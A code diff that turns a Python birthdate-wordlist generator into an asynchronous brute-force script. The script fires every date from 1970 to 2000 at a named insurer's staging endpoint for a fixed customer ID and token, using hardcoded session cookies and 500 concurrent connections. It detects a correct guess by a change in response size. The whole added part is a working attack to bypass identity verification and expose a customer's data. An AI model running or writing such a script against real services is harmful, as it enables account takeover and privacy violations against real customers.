@@ -1,13 +1,66 @@
-from datetime import datetime, timedelta
+import asyncio
+import aiohttp
 
-start_date = datetime(1970, 1, 1)
-end_date = datetime(2000, 12, 31)
+URL = "https://axa-be-stg.slgnt.eu/renderers/BODY.ASHX?ID=he3iSrSJ27GFi_hIUlgQlZtbNZSE2UVQaXIHK3P_nPaVVFL0ZhHKYhJRCt1i_bWSdSsGojLaQEf97Nu8f5x6kEJthz"
 
-current = start_date
+WORDLIST = "birthdates.txt"
 
-with open("birthdates.txt", "w") as f:
-    while current <= end_date:
-        f.write(current.strftime("%Y-%m-%d") + "\n")
-        current += timedelta(days=1)
+HEADERS = {
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Cookie": "__cf_bm=LIlvwhQyMs5Wy_P6c81iRZTEDY3nbhlnp9L.e1HKg84-1773069142-1.0.1.1-PQVLV60bKz44pXPyR0e1mvF3rf1Sg_mfLuAo6WvViPQJl34Qb6oVcjw7i8MhB8n7AKnZALgU3Xr6vJIuUka_Z4gEj06BAjQ7SpuidhcbIbI; SERVERID=4bb3a3d8debf8e66e1b9b899ca2a8daf7ef61c84d9bfff5664e8209d7d21bef6cf8c200b",
+    "User-Agent": "Mozilla/5.0"
+}
 
-print("Wordlist generated: birthdates.txt")
+# constant parameters
+STATIC_PARAMS = {
+    "TOKEN": "hyCytqHy",
+    "CIF_ID": "000000322082335"
+}
+
+
+baseline_size = None
+
+
+async def send_request(session, birthdate):
+    global baseline_size
+
+    data = STATIC_PARAMS.copy()
+    data["birthdate"] = birthdate
+
+    try:
+        async with session.post(URL, data=data) as resp:
+            text = await resp.text()
+            size = len(text)
+
+            if baseline_size is None:
+                baseline_size = size
+
+            if size != baseline_size:
+                print(f"[DIFF] {birthdate} -> size:{size}")
+            else:
+                print(f"{birthdate} -> size:{size}")
+
+    except Exception as e:
+        print(f"Error {birthdate}: {e}")
+
+
+async def main():
+
+    connector = aiohttp.TCPConnector(limit=500)
+
+    async with aiohttp.ClientSession(connector=connector, headers=HEADERS) as session:
+
+        tasks = []
+
+        with open(WORDLIST) as f:
+            for line in f:
+                birthdate = line.strip()
+
+                tasks.append(
+                    asyncio.create_task(send_request(session, birthdate))
+                )
+
+        await asyncio.gather(*tasks)
+
+
+asyncio.run(main())
